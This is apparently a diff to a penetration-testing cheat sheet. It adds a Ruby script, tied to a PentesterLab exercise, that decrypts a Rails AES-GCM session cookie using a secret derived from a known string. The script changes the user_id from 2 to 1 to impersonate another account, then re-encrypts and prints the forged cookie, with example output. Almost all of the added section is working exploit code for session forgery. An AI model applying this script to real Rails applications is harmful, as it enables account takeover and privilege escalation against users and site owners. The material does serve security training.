@@ -46,3 +46,50 @@ get '/' do
   text = "Hello Visitor!"
 end
 ```
+
+### RUBY ON RAILS: AES-GCM SIGNED SESSION 
+- Helpful: [https://emanual.github.io/ruby-docs](https://emanual.github.io/ruby-docs/classes/OpenSSL/Cipher/CipherError.html)
+```
+require 'uri'
+require 'cgi'
+require 'base64'
+require 'openssl'
+
+cookie = URI.decode("iowp3WAChN4G....TmF9TMUgkDepg%3D--xguco..6khpC--wdizT8Aw..3D%3D")
+
+def secret()
+    secret = Digest::MD5.hexdigest("PentesterLab::Application")
+    OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
+    end
+
+def decrypt(cookie)
+    cipher = OpenSSL::Cipher.new("aes-256-gcm")
+    encrypted_data, iv, auth_tag = cookie.split("--".freeze).map { |v| ::Base64.strict_decode64(v) }
+    cipher.decrypt
+    cipher.key = secret()
+    cipher.iv  = iv
+    cipher.auth_tag = auth_tag
+    cipher.auth_data = ""
+    decrypted_data = cipher.update(encrypted_data) + cipher.final
+    end
+
+def encrypt(string)
+    cipher = OpenSSL::Cipher.new("aes-256-gcm")
+    cipher.encrypt
+    cipher.key = secret()
+    iv = cipher.random_iv
+    cipher.auth_data = ""
+    encrypted_data = cipher.update(string) + cipher.final
+    blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
+    blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
+    blob
+    end
+
+string = decrypt(cookie)
+string = string.sub! '"user_id":2', '"user_id":1'
+puts CGI.escape(encrypt(string))
+
+
+# Example string = {"session_id":"7ee48973...952f595","_csrf_token":"+UV6rbAMo6QW...6lAGP8=","user_id":1}
+# Output: 6k5xPNUYdUbZX9eH...BGZ%2BfyPvi9CU%2BZOD5qKVc%3D--61raV%2BxHyFVR4Rv3--KiSR%2F9hZqMfntNewcCm9kQ%3D%3D
+```
